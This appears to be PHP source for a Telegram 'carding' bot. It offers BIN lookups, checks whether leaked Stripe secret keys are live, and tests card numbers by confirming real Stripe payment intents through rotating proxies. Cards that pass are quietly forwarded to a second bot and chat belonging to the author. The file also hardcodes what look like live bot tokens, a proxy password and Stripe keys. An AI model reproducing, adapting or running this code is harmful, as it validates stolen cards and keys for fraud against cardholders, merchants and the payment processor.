...
////////////////=============[Made with ❤️ by @SACHIOYT🔥🇵🇪]===============////////////////

///https://api.telegram.org/bot5558806227:AAE6hpKEmSZOv3hmNCiuzRFx0dEKwp8EQNs/setwebhook?url=https://2e9b-186-169-224-188.ngrok.io/bot.php



$botToken = "5558806227:AAE6hpKEmSZOv3hmNCiuzRFx0dEKwp8EQNs"; // Enter ur bot token
...
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot Made by: @SACHIOYT🔥🇵🇪</b>");
}

//////////=========[Cmds Command]=========//////////

elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>!sk</code> sk_live%0A<u>Stripe:</u> <code>!chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Info:</u> <code>/info</code> To know ur info%0A%0A<b>Bot Made by: @SACHIOYT🔥🇵🇪</b>");
}

//////////=========[Info Command]=========//////////

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A%0A<b>Bot Made by: @SACHIOYT🔥🇵🇪 </b>");
}
...
curl_close($ch);
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.''.$emoji.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Currency:</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: @SACHIOYT🔥🇵🇪 </b>');
}
curl_close($ch);
...
$rp1 = array(
  1 => 'apwkbpgv-rotate:ueh6dr5tm90g',
  2 => 'apwkbpgv-rotate:ueh6dr5tm90g',
  3 => 'apwkbpgv-rotate:ueh6dr5tm90g',
  4 => 'apwkbpgv-rotate:ueh6dr5tm90g',
  5 => 'apwkbpgv-rotate:ueh6dr5tm90g',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
...
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3LJuFvGpp2VaoC9m0heGZu24/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$firstname.'+'.$lastname.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=330936a1-ce96-46ec-b279-412d9cd5d9bfba5bd5&payment_method_data[muid]=7479ee42-6321-498e-8811-7ff3bdaf747f11ae23&payment_method_data[sid]=dff10b91-3b50-4195-ba5e-f2443b44bfe5e25704&payment_method_data[payment_user_agent]=stripe.js%2Ff0346bf10%3B+stripe-js-v3%2Ff0346bf10&payment_method_data[time_on_page]=133871&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_daf7V3BVdKqbnga0XYoYWiHF&client_secret=pi_3LJuFvGpp2VaoC9m0heGZu24_secret_rcF6mgMEyu3dqPtNkNkS9pZed');
...
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>Approved! ✅</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: @SACHIOYT🔥🇵🇪</b>');
$msg=
  "Card -» $lista
Status -» Approved CVV ✅
Result -» incorrect_zip
Gateway -» stp1
———»Details«———
Bin -»  $type - $scheme - $brand
Bank -» $bank1
Country -» $name2 $emoji - 💲$currency
———-»Info«-———-
Proxy -» $ip
Time taken -» $time's
Owner -» @SACHIOYT🇵🇪🔥";
$apiToken = "5415132418:AAFGkHG-ODxgP-U93_a9eai_EZ97oD4ZGiI"; 
    $logger = ['chat_id' => '1205717709','text' => $msg ]; 
...
$msg=
  "Card -» $lista
Status -» Approved CCN ✅
Result -» your cards security code is incorrect 
Gateway -» stp1
———»Details«———
Bin -»  $type - $scheme - $brand
Bank -» $bank1
...
$msg=
  "Card -» $lista
Status -» Approved CVV ✅
Result -» transaction_not_allowed ⚠️💸 
Gateway -» stp1
———»Details«———
Bin -»  $type - $scheme - $brand
Bank -» $bank1
...
elseif ((strpos($result2, "fraudulent")) || (strpos($result2, "fraudulent")) || (strpos($result2, "fraudulent"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>Approved! ✅</b>%0A<u>RESPONSE:</u> <b>『 ★ fraudulent」 ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: @SACHIOYT🔥🇵🇪</b>');
$msg=
  "Card -» $lista
Status -» Approved CVV ✅
Result -» fraudulent ⚠️💸 
...
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by: @SACHIOYT🔥🇵🇪 </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by: @SACHIOYT🔥🇵🇪 </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by: @SACHIOYT🔥🇵🇪 </b>");
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: @SACHIOYT🔥🇵🇪 </b>");
}}
